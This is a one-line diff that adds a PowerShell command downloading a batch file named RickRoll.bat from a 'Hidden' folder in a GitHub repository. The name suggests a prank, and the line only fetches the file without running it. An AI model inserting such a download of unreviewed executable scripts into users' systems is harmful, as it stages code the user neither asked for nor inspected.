@@ -1,0 +1,1 @@
+powershell -Command "Invoke-WebRequest https://raw.githubusercontent.com/OscarZoomer/Stuff/main/Hidden/RickRoll.bat -Outfile RickRoll.bat"
